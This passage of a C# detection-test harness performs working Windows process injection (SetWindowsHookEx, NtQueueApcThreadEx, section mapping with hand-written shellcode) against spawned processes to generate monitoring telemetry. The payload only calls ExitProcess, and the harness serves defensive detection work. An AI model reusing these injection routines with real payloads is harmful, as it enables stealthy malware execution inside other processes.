    private static void TestSetWindowsHookExInjection()
    {
        Log("[T1055] SetWindowsHookEx injection: WH_GETMESSAGE hook forces HookDll.dll into notepad");
        string dllPath = ExtractEmbeddedResource("HookDll.dll", @"C:\Sandbox\HookDll.dll");
        IntPtr hMod = LoadLibraryA(dllPath);
        if (hMod == IntPtr.Zero) throw new Win32Exception(Marshal.GetLastWin32Error(), "LoadLibraryA(HookDll)");
        IntPtr proc = GetProcAddress(hMod, "HookProc");
        if (proc == IntPtr.Zero) throw new Win32Exception(Marshal.GetLastWin32Error(), "GetProcAddress(HookProc)");
        using Process target = Process.Start(new ProcessStartInfo("notepad.exe") { UseShellExecute = true })!;
        Thread.Sleep(2000);
        target.Refresh();
        Log($"[T1055] SetWindowsHookEx target pid={target.Id}");
        uint tid = (uint)target.Threads[0].Id;
        IntPtr hook = SetWindowsHookEx(WH_GETMESSAGE, proc, hMod, tid);
        if (hook == IntPtr.Zero) throw new Win32Exception(Marshal.GetLastWin32Error(), "SetWindowsHookEx");
        try
        {
            PostThreadMessage(tid, 0 /* WM_NULL */, IntPtr.Zero, IntPtr.Zero);
            Thread.Sleep(1500);
            Log($"[T1055] SetWindowsHookEx hook installed on tid={tid} (HookDll.dll load into target expected)");
        }
        finally
        {
            UnhookWindowsHookEx(hook);
            if (!target.HasExited) target.Kill();
        }
    }

    /// <summary>
    /// #14 NtQueueApcThreadEx user-mode APC (T1055.004). Same shape as the
    /// classic APC test but goes through the Ex syscall directly (the monitor
    /// hooks NtQueueApcThreadEx separately).
    /// Expected: EID 10 + apitrace NtQueueApcThreadEx.
    /// </summary>
    private static void TestApcExInjection()
    {
        Log("[T1055.004] ApcEx injection: NtQueueApcThreadEx(ExitProcess) into alertable remote thread");
        using Process target = SpawnTarget();
        Log($"[T1055.004] ApcEx target pid={target.Id}");
        IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, target.Id);
        if (hProcess == IntPtr.Zero) throw new Win32Exception(Marshal.GetLastWin32Error(), "OpenProcess");
        try
        {
            IntPtr hThread = CreateAlertableRemoteThread(hProcess, out IntPtr tid);
            try
            {
                IntPtr exitProcess = GetExport("kernel32.dll", "ExitProcess");
                int st = NtQueueApcThreadEx(hThread, IntPtr.Zero, exitProcess, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
                if (st != 0) throw new Win32Exception(st, "NtQueueApcThreadEx");
                Log($"[T1055.004] ApcEx queued to alertable thread tid={tid}");
                WaitForSingleObject(hThread, 3000);
            }
            finally
            {
                CloseHandle(hThread);
            }
        }
        finally
        {
            CloseHandle(hProcess);
            if (!target.HasExited) target.Kill();
        }
    }

    /// <summary>
    /// #15 MapView injection (T1055). Pagefile-backed section, written via a
    /// local view, mapped into the remote process as executable, started with
    /// NtCreateThreadEx. Differs from the classic section-mapping test only in
    /// the thread-creation primitive.
    /// Expected: EID 10 + EID 8 + apitrace NtMapViewOfSection/NtCreateThreadEx.
    /// </summary>
    private static void TestMapViewInjection()
    {
        Log("[T1055] MapView injection: NtCreateSection -> local write -> NtMapViewOfSection(remote) -> NtCreateThreadEx");
        using Process target = SpawnTarget();
        Log($"[T1055] MapView target pid={target.Id}");
        IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, target.Id);
        if (hProcess == IntPtr.Zero) throw new Win32Exception(Marshal.GetLastWin32Error(), "OpenProcess");
        try
        {
            IntPtr exitProcess = GetExport("kernel32.dll", "ExitProcess");
            byte[] shellcode = new byte[14];
            shellcode[0] = 0x49;
            shellcode[1] = 0xB8;
            Buffer.BlockCopy(BitConverter.GetBytes((ulong)exitProcess.ToInt64()), 0, shellcode, 2, 8); // mov r8, ExitProcess
            shellcode[10] = 0x41;
            shellcode[11] = 0xFF;
            shellcode[12] = 0xD0; // call r8
            shellcode[13] = 0xC3; // ret

            long sectionSize = 4096;
            int st = NtCreateSection(out IntPtr hSection, SECTION_ALL_ACCESS, IntPtr.Zero, ref sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, IntPtr.Zero);
            if (st != 0) throw new Win32Exception(st, "NtCreateSection");
            try
            {
                IntPtr localBase = IntPtr.Zero;
                long localView = sectionSize;
                st = NtMapViewOfSection(hSection, CURRENT_PROCESS, ref localBase, IntPtr.Zero, (IntPtr)sectionSize, IntPtr.Zero, ref localView, 2, 0, PAGE_READWRITE);
                if (st != 0) throw new Win32Exception(st, "NtMapViewOfSection(local)");
                try
                {
                    Marshal.Copy(shellcode, 0, localBase, shellcode.Length);
                }
                finally
                {
                    NtUnmapViewOfSection(CURRENT_PROCESS, localBase);
                }

                IntPtr remoteBase = IntPtr.Zero;
                long remoteView = sectionSize;
                st = NtMapViewOfSection(hSection, hProcess, ref remoteBase, IntPtr.Zero, (IntPtr)sectionSize, IntPtr.Zero, ref remoteView, 2, 0, PAGE_EXECUTE_READ);
                if (st != 0) throw new Win32Exception(st, "NtMapViewOfSection(remote)");

                st = NtCreateThreadEx(out IntPtr hThread, THREAD_ALL_ACCESS, IntPtr.Zero, hProcess, remoteBase, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
                if (st != 0) throw new Win32Exception(st, "NtCreateThreadEx");
                Log($"[T1055] MapView remote thread created at 0x{remoteBase.ToInt64():X}");
                WaitForSingleObject(hThread, 3000);
                CloseHandle(hThread);
            }
            finally
            {
                CloseHandle(hSection);
            }
        }
        finally
        {
            CloseHandle(hProcess);
            if (!target.HasExited) target.Kill();
        }
    }

    static int Main(string[] args)
    {
        Console.WriteLine("=== Sandbox injection detection harness ===");
        // Every test is individually wrapped: one flaky/failing technique must
        // not starve the others of telemetry (a pre-existing GetThreadContext
        // flake in PE-replacement used to abort the whole run before the
        // Phase-2 tests could start).
        using Process target = SpawnTarget();
        Log($"Spawned target pid={target.Id}");

        RunSafely("RemoteThread", () => TestRemoteThreadInjection(target));
        if (!target.HasExited) target.Kill();

        using Process target2 = SpawnTarget();
        Log($"Spawned second target pid={target2.Id}");
        RunSafely("ApcInjection", () => TestApcInjection(target2));
        if (!target2.HasExited) target2.Kill();

        using Process target3 = SpawnTarget();
        Log($"Spawned third target pid={target3.Id}");
        RunSafely("ThreadHijacking", () => TestThreadHijacking(target3));
        if (!target3.HasExited) target3.Kill();

        RunSafely("Hollowing", TestProcessHollowing);
        RunSafely("PeReplacement", TestProcessHollowingPeReplacement);
        RunSafely("EarlyBirdApc", TestEarlyBirdApcInjection);
        RunSafely("DllInjection", TestDllInjection);
        RunSafely("SectionMapping", TestSectionMappingInjection);
        RunSafely("Herpaderping", TestProcessHerpaderping);
        RunSafely("HerpaderpingClassic", TestProcessHerpaderpingClassic);
        RunSafely("Ghosting", TestProcessGhosting);

        // PLAN.md Phase 2 techniques (#10-15).
        RunSafely("AtomBombing", TestAtomBombing);
        RunSafely("ModuleOverloading", TestModuleOverloading);
        RunSafely("SetWindowsHookEx", TestSetWindowsHookExInjection);
        RunSafely("ApcEx", TestApcExInjection);
        RunSafely("MapView", TestMapViewInjection);
        // #13 thread-pool injection: not implementable as a public-API test --
        // remote thread-pool insertion requires PoolParty-style undocumented
        // TP_WORK/TP_DIRECT primitives (2023 research). Logged so the gap is
        // explicit in every run's stdout.
        Log("[T1055] Thread-pool injection SKIPPED: needs PoolParty-style undocumented thread-pool primitives (no public API)");

        Log($"All injection tests completed. failures={_failures}");
        return _failures == 0 ? 0 : 1;
    }
}
